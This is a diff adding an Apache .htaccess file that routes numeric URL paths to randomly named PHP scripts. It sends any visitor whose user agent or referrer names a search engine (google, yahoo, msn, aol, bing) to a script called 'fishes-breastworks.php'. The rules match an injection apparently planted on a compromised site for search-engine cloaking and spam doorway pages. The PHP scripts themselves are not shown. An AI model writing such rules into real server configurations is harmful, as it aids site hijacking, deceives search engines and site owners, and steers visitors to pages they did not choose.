@@ -1,0 +1,20 @@
+RewriteEngine on
+RewriteRule ^1800575515/(.*)$ handicap-godfry.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^4682207317/(.*)$ latia-lanny.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^6029628024/(.*)$ lop-buoys.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^6440142034/(.*)$ lapsing-fantasy.php [QSA,L]
+
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ fishes-breastworks.php?$1 [L]
+
